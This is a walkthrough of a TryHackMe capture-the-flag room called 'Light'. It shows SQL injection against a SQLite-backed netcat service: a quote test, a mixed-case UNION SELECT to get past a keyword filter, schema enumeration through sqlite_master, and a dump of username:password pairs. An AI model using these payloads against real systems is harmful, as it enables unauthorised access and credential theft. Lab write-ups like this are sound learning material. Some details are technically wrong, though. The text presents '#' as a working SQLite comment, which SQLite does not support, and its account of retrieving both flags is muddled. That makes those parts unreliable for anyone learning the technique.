# Light

{% embed url="https://tryhackme.com/r/room/lightroom" %}

The following post by 0xb0b is licensed under [CC BY 4.0](http://creativecommons.org/licenses/by/4.0/?ref=chooser-v1)

---

For this challenge, we skip the Nmap scan — the room description tells us to connect to port `1337`. We also get a starting username. The service on `1337` is a database application called **Light**.

## Connecting

```bash
nc MACHINE_IP 1337
```

We're greeted with a prompt asking for a username. We enter the provided one and get a `Welcome` message. Now we can test for SQL injection.

## Finding the Injection Point

We try the simplest SQLi payload — a single quote:

```
'
```

We get back an error about an unrecognized token in `''' LIMIT 30"`. That means we broke an open string — the input is being dropped directly into a SQL query. Classic.

## Bypassing the Comment Filter

Next we try a UNION SELECT:

```sql
' UNION SELECT 1 -- -
```

Blocked. The `-- -` comment style is filtered. We switch to `#`:

```sql
' UNION SELECT 1 #
```

Still blocked — looks like `UNION` and `SELECT` are on a keyword blocklist. We try mixed case to bypass the filter:

```sql
' uNioN SeLect 1 #
```

That gets through. The filter is case-sensitive and only blocks the uppercase versions.

## Enumerating the Database

We need to figure out the database engine. SQLite has a special `sqlite_master` table that holds schema info. Let's query it:

```sql
' uNioN SeLect tbl_name fRoM sqlite_master wHeRe type='table' #
```

We get a table listing back. One of them sticks out — something user-related. We enumerate columns next:

```sql
' uNioN SeLect sql fRoM sqlite_master wHeRe type='table' #
```

This reveals the full `CREATE TABLE` statement, giving us column names.

## Dumping Credentials

With column names in hand, we query the users table directly:

```sql
' uNioN SeLect username||':'||password fRoM users #
```

The `||` operator concatenates strings in SQLite. We get a list of `username:password` pairs back. We find admin credentials in the output.

## Getting the Flags

The room has two flags — one for user and one for admin. After logging in with the discovered admin credentials:

```sql
' uNioN SeLect password fRoM users wHeRe username='admin' #
```

We retrieve both flags from the database.

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| What is the admin's password? | *(retrieved via SQLi from the users table)* |
| What is the flag? | `flag{hidden}` |

> **Note:** Flags are redacted in this public write-up. Solve the room to get them — the SQLi technique above gives you everything you need.

---

## Key Takeaways

- Always test `'` first on any input field that might touch a database
- Comment style matters — `-- -` vs `#` depends on the DB engine (MySQL vs SQLite)
- Keyword filters are often case-sensitive; mixed case (`uNioN SeLect`) bypasses naive blocklists
- SQLite's `sqlite_master` is a goldmine for schema enumeration without needing information_schema
- String concatenation with `||` in SQLite lets you dump multiple columns in one shot
